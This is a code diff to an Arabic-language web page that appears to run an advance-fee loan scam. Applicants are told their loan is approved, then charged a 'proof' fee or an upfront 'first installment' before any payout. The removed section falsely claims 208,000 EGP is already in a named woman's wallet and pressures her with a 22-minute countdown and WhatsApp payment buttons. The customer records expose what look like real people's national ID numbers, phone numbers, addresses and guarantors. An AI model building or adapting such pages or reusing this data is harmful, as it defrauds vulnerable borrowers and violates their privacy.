@@ -7,7 +7,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <style>
-        /* ===== RESET & ROOT ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
             --emerald: #2ECC71;
@@ -621,7 +620,15 @@
             return { months: plan.months, installment: plan.installment };
         }
 
-        function getProofAmount(loanAmount) {
+        // ================================================================
+        //  دالة حساب مبلغ الإثبات - معدلة لكل عميل على حدة
+        // ================================================================
+        function getProofAmount(loanAmount, nationalId) {
+            // العميل مصطفى محمود محمد قاسم يحصل على 8000 ج.م
+            if (nationalId === "29210012800995") {
+                return 8000;
+            }
+            // باقي العملاء حسب المبلغ
             if (loanAmount < 100000) return 6000;
             else return 8000;
         }
@@ -639,25 +646,9 @@
         }
 
         // ================================================================
-        //  DATABASE - العملاء المطلوبين فقط
+        //  DATABASE - العملاء المطلوبين فقط (تم حذف سلمى)
         // ================================================================
         const customersDatabase = {
-
-            // سلمى رضا محمود احمد
-            "291092001": {
-                name: "سلمى رضا محمود احمد",
-                loan: 200000,
-                wallet: "اتصالات كاش",
-                walletNum: "01108117433",
-                status: "approved",
-                job: "صاحب مشروع قائم",
-                income: "80,000",
-                address: "73 طومان باى امتداد مستشفى الجنزورى خلف قصر الطاهره بجوار شركه ابو زيد للعطور",
-                facebook: "Loma shehata",
-                hasEtisalat: true,
-                hasVodafone: false,
-                guarantor: { name: "سوزان وجدي خليفه عبد الحليم", relation: "أم", nationalId: "26906211601822", phone: "01024626523" }
-            },
 
             // عبدالكريم مصطفي عبدالكريم مهني
             "30410252105172": {
@@ -690,75 +681,38 @@
                 hasVodafone: false,
                 guarantor: { name: "زيان ابراهيم زيان", relation: "أب", nationalId: "24807081400271", phone: "01011107949" }
             },
-            // 270- ايهاب خاطر
-"26803241801253": {
-    name: "ايهاب خاطر",
-    loan: 75000,
-    wallet: "اتصالات كاش",
-    walletNum: "01132099780",
-    status: "approved",
-    job: "صاحب مهنة",
-    income: "12,000",
-    address: "27مسجد التوحيد المعمورة البلد بجوار صيدليه العائلات",
-    facebook: "ehabkhaetr@gmail.com",
-    hasEtisalat: true,
-    hasVodafone: false,
-    guarantor: { name: "علاء ايهاب محمد احمد", relation: "ابن", nationalId: "29709271801996", phone: "01286626327" }
-},
-// 271- مصطفى محمود محمد قاسم
-"29210012800995": {
-    name: "مصطفى محمود محمد قاسم",
-    loan: 80000,
-    wallet: "اتصالات كاش",
-    walletNum: "01132166502",
-    status: "approved",
-    job: "موظف حكومي",
-    income: "8,000",
-    address: "اسوان مركز ادفو قرية الطوناب بجوار المثلث",
-    facebook: "مصطفى قاسم",
-    hasEtisalat: true,
-    hasVodafone: false,
-    guarantor: { name: "عبد الرحمن محمود محمد قاسم", relation: "أخ", nationalId: "30211202801078", phone: "01153306234" }
-},
-// 228- صالح احمد عبدالرؤف خاطر
-{
-    id: "28001021502539",
-    name: "صالح احمد عبدالرؤف خاطر",
-    job: "مندوب مبيعات",
-    loanRaw: "200,000",
-    loanTerm: "60 شهر",
-    installment: "4,440",
-    total: "266,400",
-    wallet: "اتصالات كاش",
-    walletNum: "01016748193",
-    hasEtisalat: true,
-    hasVodafone: false,
-    clientStatus: "pending",
-    reviewStatus: "approved",
-    guarantorName: "عمرو صالح احمد خاطر (30407171501692 - 01008664724)",
-    guarantorRelation: "ابن",
-    reason: "تطوير العمل",
-    otherLoans: "لا يوجد اى قروض",
-    income: "6,000",
-    address: "محافظة كفرالشيخ دسوق",
-    facebook: "Salehkhater",
-    company: "كاش فاستر للتمويل"
-},
-// 273- رامي فرج سعد فرج
-"28709181800172": {
-    name: "رامي فرج سعد فرج",
-    loan: 75000,
-    wallet: "اتصالات كاش",
-    walletNum: "01108368482",
-    status: "approved",
-    job: "صاحب مهنة",
-    income: "15,000",
-    address: "24من شارع 16 الإصلاح الفلكي عماره 5 الدور الثاني شقه 5بجوار منفذ بيع منتجات القوات المسلحه",
-    facebook: "ramy fargramy45@gamil.com",
-    hasEtisalat: true,
-    hasVodafone: false,
-    guarantor: { name: "هبه فرج سعد فرج", relation: "اخت", nationalId: "28310221800383", phone: "01277377292" }
-},
+
+            // مصطفى محمود محمد قاسم - مبلغ الإثبات 8000 ج.م
+            "29210012800995": {
+                name: "مصطفى محمود محمد قاسم",
+                loan: 80000,
+                wallet: "اتصالات كاش",
+                walletNum: "01132166502",
+                status: "approved",
+                job: "موظف حكومي",
+                income: "8,000",
+                address: "اسوان مركز ادفو قرية الطوناب بجوار المثلث",
+                facebook: "مصطفى قاسم",
+                hasEtisalat: true,
+                hasVodafone: false,
+                guarantor: { name: "عبد الرحمن محمود محمد قاسم", relation: "أخ", nationalId: "30211202801078", phone: "01153306234" }
+            },
+
+            // رامي فرج سعد فرج
+            "28709181800172": {
+                name: "رامي فرج سعد فرج",
+                loan: 75000,
+                wallet: "اتصالات كاش",
+                walletNum: "01108368482",
+                status: "approved",
+                job: "صاحب مهنة",
+                income: "15,000",
+                address: "24من شارع 16 الإصلاح الفلكي عماره 5 الدور الثاني شقه 5بجوار منفذ بيع منتجات القوات المسلحه",
+                facebook: "ramy fargramy45@gamil.com",
+                hasEtisalat: true,
+                hasVodafone: false,
+                guarantor: { name: "هبه فرج سعد فرج", relation: "اخت", nationalId: "28310221800383", phone: "01277377292" }
+            }
         };
 
         // ================================================================
@@ -767,7 +721,7 @@
 
         function buildLoanCard(customer) {
             const plan = getInstallmentPlan(customer.loan);
-            const proofAmount = getProofAmount(customer.loan);
+            const proofAmount = getProofAmount(customer.loan, currentNationalId);
             const walletDisplay = customer.wallet || 'غير محدد';
 
             return `
@@ -805,83 +759,12 @@
             `;
         }
 
-        // ================================================================
-        //  إشعار دفع القسط الأول للعميلة سلمى رضا
-        // ================================================================
-
         function buildPaymentNotice(customer) {
-            if (customer.name === "سلمى رضا محمود احمد") {
-                return `
-                    <div style="background: linear-gradient(145deg, #1a1a2e, #0f0f1f); border: 3px solid #FF6B6B; border-radius: 1.4rem; padding: 1.5rem 1.2rem; margin: 0.8rem 0; box-shadow: 0 0 40px rgba(239, 68, 68, 0.15); animation: pulseBorder 1.5s ease-in-out infinite;">
-                        <style>
-                            @keyframes pulseBorder { 0%,100% { box-shadow: 0 0 40px rgba(239, 68, 68, 0.15); } 50% { box-shadow: 0 0 80px rgba(239, 68, 68, 0.35), 0 0 120px rgba(239, 68, 68, 0.1); } }
-                            @keyframes blinkRed { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-                            @keyframes goldPulse { 0%,100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.7; transform: scale(1.03); } }
-                            @keyframes blinkGold { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
-                        </style>
-                        <div style="text-align:center;margin-bottom:0.8rem;">
-                            <span style="font-size:3rem;display:block;margin-bottom:0.3rem;">💰</span>
-                            <h2 style="color:var(--gold);font-size:1.4rem;font-weight:900;margin:0;">✅ مبلغ 208,000 ج.م بحوزتك الآن</h2>
-                            <p style="color:var(--text-muted);font-size:0.8rem;margin-top:0.2rem;">(200,000 ج.م قيمة القرض + 8,000 ج.م مبلغ الإثبات)</p>
-                        </div>
-                        <div style="background:rgba(46,204,113,0.06);border:2px solid var(--emerald);border-radius:0.8rem;padding:0.8rem;margin:0.6rem 0;text-align:center;">
-                            <p style="color:#FFF;font-size:0.95rem;line-height:1.9;margin:0;">
-                                <span style="color:var(--emerald);font-weight:700;">✅ تم إيداع المبلغ بالكامل في محفظتك</span><br>
-                                <span style="color:var(--gold);font-weight:700;animation:goldPulse 1.2s ease-in-out infinite;">🔒 المبلغ محجوز لحسابك</span><br>
-                                <span style="color:var(--text-muted);font-size:0.85rem;">سيتم استرداد مبلغ الإثبات (8,000 ج.م) فور إتمام إجراءات الصرف</span>
-                            </p>
-                        </div>
-                        <div style="background:rgba(139,92,246,0.08);border:2px solid var(--purple);border-radius:0.8rem;padding:0.8rem;margin:0.6rem 0;text-align:center;">
-                            <p style="color:#FFF;font-size:0.9rem;line-height:1.9;margin:0;">
-                                <span style="color:var(--purple);font-weight:700;">📌 تم عمل استثناءات لك من ممثلة الدعم الفني على واتساب</span><br>
-                                <span style="color:var(--gold);font-weight:700;animation:blinkGold 1s ease-in-out infinite;">⏳ أنتِ في مرحلة نزول المبلغ المدفوع لحسابك مباشرة</span><br>
-                                <span style="color:var(--text-muted);font-size:0.8rem;">⚠️ <span style="color:#FF6B6B;font-weight:700;">نتأسف لك، لابد من دفع القسط في أسرع وقت ممكن</span><br><span style="color:var(--gold);font-weight:700;">💰 المبلغ المستحق لك حالياً هو 208,000 ج.م</span></span>
-                            </p>
-                        </div>
-                        <div style="background:rgba(239,68,68,0.06);border-right:4px solid #FF6B6B;padding:1rem;border-radius:0.8rem;margin:0.6rem 0;">
-                            <p style="color:#FFF;font-size:0.95rem;line-height:1.9;margin:0;">
-                                <strong style="color:#FF6B6B;">📌 عزيزتي سلمى رضا،</strong><br><br>
-                                <span style="color:var(--gold);font-weight:700;">✅ الآن لديك 208,000 ج.م</span> في حساب محفظتك.<br><br>
-                                <span style="color:#FF6B6B;font-weight:700;">🔴 المطلوب منك الآن: دفع القسط الأول (4,440 ج.م)</span><br>
-                                <span style="color:var(--text-muted);font-size:0.85rem;">⚠️ <strong style="color:#FF6B6B;">لا يمكن خصم أي مبلغ من الـ 208,000 ج.م</strong> — المبلغ محجوز بالكامل لحسابك.<br>القسط الأول (4,440 ج.م) مطلوب دفعه <strong style="color:#FF6B6B;">من خارج المبلغ الموجود</strong> لإثبات الجدارة الائتمانية.<br><br><span style="color:var(--gold);font-weight:700;">💰 سيتم صرف 208,000 ج.م لحسابك فوراً بعد دفع القسط</span></span>
-                            </p>
-                        </div>
-                        <div style="background:rgba(239,68,68,0.08);border:2px solid #FF6B6B;border-radius:1rem;padding:1rem;margin:0.6rem 0;text-align:center;">
-                            <span style="font-size:0.8rem;color:var(--text-muted);display:block;">⏳ الوقت المتبقي قبل شطب الطلب</span>
-                            <span style="font-size:2.8rem;font-weight:900;color:#FF6B6B;font-family:monospace;display:block;letter-spacing:4px;" id="paymentTimer">22:00</span>
-                            <span style="font-size:0.7rem;color:#FF6B6B;font-weight:700;">⚠️ في حالة عدم الدفع خلال 22 دقيقة، سيتم تعليق الطلب لمدة 90 يوماً</span><br>
-                            <span style="font-size:0.6rem;color:var(--text-muted);"><span style="color:var(--gold);">🔒 المبلغ محجوز لحسابك</span> — سيتم الصرف فور دفع القسط</span>
-                        </div>
-                        <div style="background:rgba(255,255,255,0.03);border-radius:0.8rem;padding:0.8rem;margin:0.6rem 0;">
-                            <p style="color:var(--text-muted);font-size:0.85rem;line-height:1.9;margin:0;">
-                                <span style="color:var(--gold);font-weight:700;">📌 ماذا يحدث بعد دفع القسط؟</span><br>
-                                ✅ سيتم <strong style="color:var(--gold);">فتح رابط التحويل</strong> لتستلم المبلغ فوراً.<br>
-                                ✅ سيتم <strong style="color:var(--emerald);">استرداد مبلغ الإثبات (8,000 ج.م)</strong> إلى حسابك.<br>
-                                ✅ سيصبح المبلغ <strong style="color:var(--gold);">208,000 ج.م</strong> متاحاً لك بالكامل.<br><br>
-                                <span style="color:#FF6B6B;font-weight:700;">🔴 ماذا يحدث إذا لم تدفعي؟</span><br>
-                                ❌ سيتم <strong style="color:#FF6B6B;">شطب طلبك</strong>.<br>
-                                ❌ لن تتمكني من صرف المبلغ لحسابك خلال هذه الفترة.<br><br>
-                                <span style="color:var(--purple);font-weight:700;">📞 يرجى التواصل مع التحويلات المالية قبل شطب الطلب</span><br>
-                                <span style="color:var(--text-muted);font-size:0.7rem;">تم عمل استثناءات لك من ممثلة الدعم الفني على واتساب</span>
-                            </p>
-                        </div>
-                        <div style="background:rgba(46,204,113,0.04);border:2px solid var(--emerald);border-radius:0.8rem;padding:0.8rem;margin:0.6rem 0;text-align:center;">
-                            <p style="color:var(--text-muted);font-size:0.8rem;margin:0;">
-                                <span style="color:var(--emerald);font-weight:700;">💡 تذكير:</span> القسط الأول = <strong style="color:var(--gold);">4,440 ج.م</strong><br>
-                                <span style="font-size:0.7rem;color:var(--text-muted);">هذا المبلغ مطلوب دفعه <strong style="color:#FF6B6B;">من خارج الـ 208,000 ج.م</strong> لإثبات الجدارة<br><span style="color:var(--gold);">🔒 الـ 208,000 ج.م محجوزة بالكامل لحسابك</span><br><span style="color:var(--gold);font-weight:700;">💰 سيتم صرف 208,000 ج.م لحسابك فوراً</span></span>
-                            </p>
-                        </div>
-                        <button class="btn btn-danger" id="payFirstInstallmentBtn" style="margin-top:0.6rem;background:linear-gradient(135deg,#FF6B6B,#EE4444);"><i class="fas fa-money-bill-wave"></i> 💰 دفع القسط الأول الآن</button>
-                        <button class="btn btn-whatsapp" id="paymentSupportBtn" style="margin-top:0.3rem;"><i class="fab fa-whatsapp fa-lg"></i> 📞 تواصل مع التحويلات المالية</button>
-                        <div style="text-align:center;margin-top:0.6rem;font-size:0.6rem;color:var(--text-muted);"><i class="fas fa-lock"></i> عملية آمنة ومشفرة | جميع البيانات محفوظة</div>
-                    </div>
-                `;
-            }
             return '';
         }
 
         function buildProofSection(customer) {
-            const proofAmount = getProofAmount(customer.loan);
+            const proofAmount = getProofAmount(customer.loan, currentNationalId);
             const plan = getInstallmentPlan(customer.loan);
             const firstDate = getFirstInstallmentDate();
 
@@ -980,7 +863,6 @@
 
             bindButtons(customer);
             startTimers(customer);
-            startPaymentTimer();
         }
 
         // ================================================================
@@ -1004,37 +886,6 @@
             }
         }
 
-        function startPaymentTimer() {
-            const timerEl = document.getElementById('paymentTimer');
-            if (!timerEl) return;
-            let seconds = 22 * 60;
-            if (paymentInterval) clearInterval(paymentInterval);
-            paymentInterval = setInterval(() => {
-                if (seconds <= 0) {
-                    clearInterval(paymentInterval);
-                    timerEl.innerText = "00:00";
-                    timerEl.style.color = "#FF6B6B";
-                    timerEl.style.animation = "blinkRed 0.5s ease-in-out infinite";
-                    const container = timerEl.closest('div');
-                    if (container) {
-                        container.innerHTML = `<div style="text-align:center;padding:0.5rem;"><span style="font-size:2rem;display:block;">⛔</span><h3 style="color:#FF6B6B;font-size:1.1rem;">❌ تم تعليق الطلب لمدة 90 يوماً</h3><p style="color:var(--text-muted);font-size:0.8rem;">لم يتم دفع القسط الأول في الوقت المحدد.<br>يرجى التواصل مع الدعم الفني لإعادة تفعيل الطلب.</p></div>`;
-                        if (currentCustomer && currentNationalId) {
-                            customersDatabase[currentNationalId].status = 'pending';
-                        }
-                    }
-                    return;
-                }
-                seconds--;
-                const mins = Math.floor(seconds / 60);
-                const secs = seconds % 60;
-                timerEl.innerText = `${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
-                if (seconds < 60) {
-                    timerEl.style.color = '#FF6B6B';
-                    timerEl.style.animation = 'blinkRed 0.5s ease-in-out infinite';
-                }
-            }, 1000);
-        }
-
         // ================================================================
         //  BIND BUTTONS
         // ================================================================
@@ -1043,7 +894,7 @@
             const proofBtn = document.getElementById('proofBtn');
             if (proofBtn) {
                 proofBtn.onclick = () => {
-                    const proofAmount = getProofAmount(customer.loan);
+                    const proofAmount = getProofAmount(customer.loan, currentNationalId);
                     const plan = getInstallmentPlan(customer.loan);
                     const firstDate = getFirstInstallmentDate();
                     let msg = `📤 إرسال إثبات الجدارة الائتمانية\n\nالعميل: ${customer.name}\nالرقم القومي: ${currentNationalId}\nالوظيفة: ${customer.job || 'غير مسجل'}\nالمبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\nمبلغ الإثبات: ${proofAmount.toLocaleString('ar-EG')} ج.م\nالقسط الشهري: ${plan.installment.toLocaleString('ar-EG')} ج.م\nمدة القسط: ${plan.months} شهر\nأول قسط: ${firstDate}\n\n`;
@@ -1067,21 +918,6 @@
             if (supportBtn) {
                 supportBtn.onclick = () => {
                     openWhatsApp(`📞 طلب دعم فني\nالعميل: ${currentCustomer?.name || ''}\nالرقم القومي: ${currentNationalId || ''}`);
-                };
-            }
-
-            const payBtn = document.getElementById('payFirstInstallmentBtn');
-            if (payBtn) {
-                payBtn.onclick = () => {
-                    let msg = `💰 دفع القسط الأول\n\nالعميل: ${customer.name}\nالرقم القومي: ${currentNationalId}\nالمبلغ: ${customer.loan.toLocaleString('ar-EG')} ج.م\nالقسط الأول: 4,440 ج.م\n\nأقر أنا ${customer.name} بأنني قمت بدفع القسط الأول بنجاح.\nأطلب تفعيل صرف المبلغ بالكامل إلى حسابي.`;
-                    openWhatsApp(msg);
-                };
-            }
-
-            const paymentSupportBtn = document.getElementById('paymentSupportBtn');
-            if (paymentSupportBtn) {
-                paymentSupportBtn.onclick = () => {
-                    openWhatsApp(`📞 طلب دعم فني - دفع القسط الأول\nالعميل: ${currentCustomer?.name || ''}\nالرقم القومي: ${currentNationalId || ''}`);
                 };
             }
         }
